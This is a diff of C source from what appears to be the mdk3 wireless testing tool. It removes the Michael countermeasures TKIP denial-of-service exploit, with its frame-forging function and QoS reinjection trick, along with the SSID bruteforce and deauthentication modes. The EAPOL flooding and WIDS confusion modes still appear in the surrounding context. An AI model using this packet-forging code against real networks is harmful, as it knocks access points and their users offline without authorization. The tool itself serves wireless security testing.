@@ -167,9 +167,6 @@ int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP
 
 		"TEST MODES:\n"
 
-		"m   - Michael Countermeasures Shutdown Exploit (TKIP DoS)\n"
-		"      Cancels all traffic continuously by faking a replay attack or by\n"
-		"      injecting bursts of malformed packets.\n"
 		"x   - 802.1X tests\n"
 		"      EAP tests for WPA(2). Can flood EAPOL start and EAPOL logoff messages.\n"
 		"w   - WIDS/WIPS Confusion\n"
@@ -186,20 +183,6 @@ int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP
 		"      network to WEP or disable encryption. More effective in\n"
 		"      combination with social engineering.\n";
 
-
-char use_mich[]="m   - Michael shutdown exploitation (TKIP)\n"
-		"      Cancels all traffic continuously\n"
-		"      -t <bssid>\n"
-		"         Set Mac address of target AP\n"
-		"      -w <seconds>\n"
-		"         Seconds between bursts (Default: 10)\n"
-		"      -n <ppb>\n"
-		"         Set packets per burst (Default: 70)\n"
-		"      -j\n"
-		"         Use the new TKIP QoS-Exploit\n"
-		"         Needs just a few packets to shut AP down!\n"
-		"      -s <pps>\n"
-		"         Set speed (Default: 400)\n";
 
 char use_eapo[]="x   - 802.1X tests\n"
 		"      0 - EAPOL Start packet flooding\n"
@@ -479,75 +462,6 @@ void mac_bruteforce_sniffer()
 
 }
 
-struct pckt false_tkip(unsigned char *target)
-{
-    struct pckt michael, src;
-    int length, i, prio;
-
-    if (useqosexploit) {
-	printf("Waiting for one QoS Data Packet...\n");
-
-	while(1) {
-	    length = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
-	    //QoS?
-	    if (pkt_sniff[0] != 0x88) continue;
-	    //ToDS?
-	    if (! (pkt_sniff[1] & 0x01)) continue;
-	    //And not WDS?
-	    if (pkt_sniff[1] & 0x02) continue;
-	    //From our target?
-	    if (target == NULL) break;
-	    if (memcmp(pkt_sniff+4, target, ETHER_ADDR_LEN)) continue;
-	    break;
-	}
-
-	unsigned char *mac = pkt_sniff + 4;
-
-	printf("QoS PACKET to %02X:%02X:%02X:%02X:%02X:%02X with Priority %d! Reinjecting...\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_sniff[24]);
-//	print_packet(pkt_sniff, length);
-
-	prio = pkt_sniff[24];
-
-	for (i=0; i < 3 ; i++) {
-	    if (prio == i) continue;
-	    pkt_sniff[24] = i;
-	    osdep_send_packet(pkt_sniff, length);
-	}
-
-	i++;
-	michael.data = pkt_sniff;
-	michael.len = length;
-
-	return michael;
-
-    } else {
-	// length = (rand() % 246) + 20;
-	length = 32;
-	src = generate_mac(0);
-    
-	src[0] = 0x00;
-    
-	michael.len = length + 32;
-	michael.data = (unsigned char*) malloc(michael.len);
-	memcpy(michael.data, MICHAEL, 32);
-	memcpy(michael.data+4, target, ETHER_ADDR_LEN);
-	memcpy(michael.data+10, src, ETHER_ADDR_LEN);
-	memcpy(michael.data+16, target, ETHER_ADDR_LEN);
-	free(src);
-
-	//random extended IV
-	michael.data[24] = rand() & 0xFF;
-	michael.data[25] = rand() & 0xFF;
-	michael.data[26] = rand() & 0xFF;
-    
-	//random data
-	for(i=0; i<length; i++) {
-	    michael.data[i+32] = rand() & 0xFF;
-	}
-    }
-
-    return michael;
-}
 
 struct pckt create_assoc_frame(unsigned char *ssid, int ssid_len, unsigned char *ap, unsigned char *sta, int auth_flag, int ucast_flag, int mcast_flag)
 {
@@ -1181,81 +1095,7 @@ int mdk_parser(int argc, char *argv[])
     char *list_file = NULL;       // Filename for periodical white/blacklist processing
     t_prev = (time_t) malloc(sizeof(t_prev));
 
-    // GCC Warning avoidance
-    mac.data = NULL;
-    mac.len = 0;
-    frm.data = NULL;
-    frm.len = 0;
 
-    if ((argc < 3) || (strlen(argv[2]) != 1))
-    {
-	printf(use_head);
-	return -1;
-    }
-
-    /* Parsing Options - Need to switch to optarg parser? */
-
-    switch (argv[2][0])
-    {
-
-
-    case 'p':
-	mode = 'p';
-	for (t=3; t<argc; t++)
-	{
-	    if (! strcmp(argv[t], "-b"))
-	    {
-		if(argc<=7){
-	   		printf("\nYou have to specify at least:\n \
-			\r a channel (-c), a target-mac (-t) and a character-set:\n \
-			\r all printable (a)\n \
-			\r lower case (l)\n \
-			\r upper case (u)\n \
-			\r numbers (n)\n \
-			\r lower and upper case (c)\n \
-			\r lower and upper plus numbers (m)\n \
-			\noptional:\n proceed with SSID (-p <SSID>)\n packets per second (-s)\n");
-	   printf("\ne.g. : mdk3 ath0 p -b a -p SSID -c 2 -t 00:11:22:33:44:55 -s 1\n\n");
-	   return -1;
-        }
-		real_brute = 1;
-		mode = 'P';
-		if (argc > t) brute_mode = argv[t+1][0];
-		printf("\nSSID Bruteforce Mode activated!\n");
-		brute_ssid = (char*) malloc (256 * sizeof(char));
-		memset(brute_ssid, 0, (256 * sizeof(char)));
-		
-	    }
-	    if (!strcmp(argv[t], "-p")) {
-		    brute_ssid = argv[t+1];
-		    printf("\nproceed with: %s",brute_ssid );
-		    brute_ssid[0]--;
-		}
-	    if (! strcmp(argv[t], "-c")){
-                if (argc > t+1){ 
-		    printf("\n\nchannel set to: %d", atoi(argv[t+1]));
-		    osdep_set_channel(atoi(argv[t+1]));
-		    }
-            }
-	    if (! strcmp(argv[t], "-e")) if (argc > t+1) ssid = argv[t+1];
-	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
-		ssid_file_name = argv[t+1];
-		mode = 'P';
-		printf("\nSSID Wordlist Mode activated!\n");
-	    }
-	    if (! strcmp(argv[t], "-t")) {
-		if (! argc > t+1) { printf(use_prob); return -1; }
-		target = parse_mac(argv[t+1]);
-	    }
-	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
-		pps = strtol(argv[t+1], (char **) NULL, 10);
-		usespeed = 1;
-	    }
-	    if (! strcmp(argv[t], "-r")) {
-	        renderman_discovery = 1; 
-	    }
-	}
-    break;
     case 'w':
 	mode = 'w';
 	for (t=3; t<argc; t++)
@@ -1281,31 +1121,7 @@ int mdk_parser(int argc, char *argv[])
 	    }
 	}
     break;
-    case 'm':
-        mode = 'm';
-        usespeed = 1;
-        pps = 400;
-	for (t=3; t<argc; t++)
-	{
-	    if (! strcmp(argv[t], "-t")) {
-		if (! (argc > t+1)) { printf(use_mich); return -1; }
-		target = parse_mac(argv[t+1]);
-	    }
-	    if (! strcmp(argv[t], "-n")) if (argc > t+1) {
-		ppb = strtol(argv[t+1], (char **) NULL, 10);
-	    }
-	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
-		wait = strtol(argv[t+1], (char **) NULL, 10);
-	    }
-	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
-		pps = strtol(argv[t+1], (char **) NULL, 10);
-		usespeed = 1;
-	    }
-	    if (! strcmp(argv[t], "-j")) {
-		useqosexploit = 1;
-	    }
-	}
-    break;
+
     case 'x':
 	mode = 'x';
         if (argc < 4) { printf(use_eapo); return -1; }
@@ -1346,37 +1162,7 @@ int mdk_parser(int argc, char *argv[])
 	    }
 	}
 	break;
-    case 'd':
-	mode = 'd';
-	for (t=3; t<argc; t++)
-	{
-	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
-		pps = strtol(argv[t+1], (char **) NULL, 10);
-		usespeed = 1;
-	    }
-	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
-		if (wblist != 0) { printf(use_deau); return -1; }
-		load_whitelist(argv[t+1]);
-		list_file = argv[t+1];
-		wblist = 1;
-	    }
-	    if (! strcmp(argv[t], "-b")) if (argc > t+1) {
-		if (wblist != 0) { printf(use_deau); return -1; }
-		load_whitelist(argv[t+1]);
-		list_file = argv[t+1];
-		wblist = 2;
-	    }
-	    if (! strcmp(argv[t], "-c")) {
-		if (argc > t+1) {
-		    // There is a channel list given
-		    init_channel_hopper(argv[t+1], 3);
-		} else {
-		    // No list given
-		    init_channel_hopper(NULL, 3);
-		}
-	    }
-	}
-    break;
+
     case 'f':
         mode = 'f';
         usespeed = 0;
@@ -1418,46 +1204,13 @@ int mdk_parser(int argc, char *argv[])
 
     printf("\n");
 
-    if (renderman_discovery) {
-        if (target != NULL) printf("WARNING: Target switch ignored in discovery mode.\n");
-	if ((ssid == NULL) && (ssid_file_name == NULL)) {
-	  printf("Please either specify an SSID or a filename with SSIDs to probe for\n");
-          exit(-1);
-	} else if ((ssid != NULL) && (ssid_file_name != NULL)) {
-	  printf("Cannot use both options -e and -f at the same time.\n");
-	  exit(-1);
-	}
-	mode = 'r';
-	brute_ssid = ssid;
-    }
     
     if ((mode == 'w') && (got_ssid == 0)) {
 	printf("Please specify a target ESSID!\n\n");
 	printf(use_wids);
 	return -1;
     }
-    if ((mode == 'P') && (usespeed == 0)) {
-	usespeed = 1; pps = 300;
-    }
-    if ((mode == 'P') && (real_brute) && (target == NULL)) {
-	printf("Please specify a target (-t <MAC>)\n");
-	return -1;
-    }
-    if ((mode == 'p') && (ssid == NULL) && (ssid_file_name == NULL)) {
-	printf("Please specify an ESSID (option -e) , a filename (option -f) or bruteforce mode (-b)\n");
-	return -1;
-    }
-    if ((mode == 'P') && (target == NULL))
-	printf("WARNING: No target (-t <MAC>) specified, will show ALL responses and stop on EOF!\n");
-    if ((mode == 'p') && (target != NULL))
-	printf("WARNING: Target ignored when not in Bruteforce mode\n");
-    if (((mode == 'm') || (mode == 'f')) && (target == NULL))
-    {
-	if (! useqosexploit) {  // We need no target 
-	    printf("Please specify MAC (option -t)\n");
-	    return -1;
-	}
-    }
+
     if (mode == 'x') {
 	if ( (target == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
           printf("Please specify MAC of target AP (option -t)\n");
@@ -1489,23 +1242,6 @@ int mdk_parser(int argc, char *argv[])
 	switch (mode)
 	{
 
-	case 'p':
-	    mac = generate_mac(1);
-	    frm = create_probe_frame(ssid, mac, NULL);
-	    break;
-	case 'P':
-	    if (real_brute) {
-		frm = ssid_brute_real();
-	    } else {
-		frm = ssid_brute();
-	    }
-	    break;
-	case 'd':
-	    frm = amok_machine(list_file);
-	    break;
-        case 'm':
-            frm = false_tkip(target);
-            break;
 	case 'x':
             switch (eapol_test) {
               case EAPOL_TEST_START_FLOOD:
@@ -1537,12 +1273,7 @@ int mdk_parser(int argc, char *argv[])
 	osdep_send_packet(frm.data, frm.len);
 	nb_sent_ps++;
 	nb_sent++;
-	if (useqosexploit) { nb_sent_ps += 3; nb_sent += 3; }	//Yes, I know... too lazy.
 
-	/* User wants check for responses? */
-
-	if ((mode=='a' || mode=='A') && ! check) check_auth(ap);
-	if (mode=='p') resps += check_probe(mac);
 
 	/* Does another thread want to exit? */
 
@@ -1566,10 +1297,6 @@ statshortcut:
 	    resps=0;
 	    total_time++;
 	}
-
-	// Waiting for next burst in Michael Test
-        if(! (nb_sent % ppb) && (mode == 'm'))
-	    sleep(wait);
 
     }   // Play it again, Johnny!
 
